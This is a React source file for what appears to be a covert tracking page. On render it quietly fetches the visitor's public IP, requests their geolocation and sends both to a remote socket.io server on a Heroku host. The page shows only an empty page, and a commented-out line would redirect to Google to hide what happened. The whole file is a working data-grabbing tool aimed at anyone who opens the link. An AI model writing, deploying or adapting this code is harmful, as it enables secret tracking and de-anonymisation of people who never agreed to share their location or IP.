import React, { Component } from "react";
import { geolocated } from "react-geolocated";
import geolocator from "geolocator";
import axios from "axios";
import socketIOClient from "socket.io-client";
import "./App.css";

class App extends Component {
  constructor() {
    super();
    this.state = {
      response: false,
      endpoint: "https://geolocalizacion1.herokuapp.com/",
      coords: null
    };
    this.socket = null;
  }
  componentDidMount() {
    const { endpoint } = this.state;
    this.socket = socketIOClient(endpoint);
  }

  prueba() {
    let search = window.location.search;
    let params = new URLSearchParams(search);
    let foo = params.get("j");
    let obj = { save: 0 };

    if (foo) {
      if (foo == 1) obj.save = 1;
    }

    axios.get("https://api.ipify.org/?format=json").then(resp => {
      obj.ip = resp.data.ip;
      if (this.props.coords != null) {
        var geo_options = {
          enableHighAccuracy: false,
          maximumAge: 0,
          timeout: 27000
        };
        navigator.geolocation.getCurrentPosition(
          this.success,
          this.error,
          geo_options
        );
        let { latitude, longitude } = this.props.coords;
        obj.latitude = latitude;
        obj.longitude = longitude;
      }
      this.socket.emit("coordenites", obj);
      setTimeout(() => {
        //window.location.replace("https://www.google.com/");
      }, 5000);
    });
  }
  success(coord) {
    //console.log(coord);
  }
  error(err) {
    console.log(err);
  }

  render() {
    this.prueba();
    return <div></div>;
  }
}

export default geolocated({
  positionOptions: {
    enableHighAccuracy: true,
    maximumAge: 0,
    timeout: Infinity
  },
  watchPosition: false,
  userDecisionTimeout: null,
  suppressLocationOnMount: false,
  geolocationProvider: navigator.geolocation,
  isOptimisticGeolocationEnabled: true
})(App);
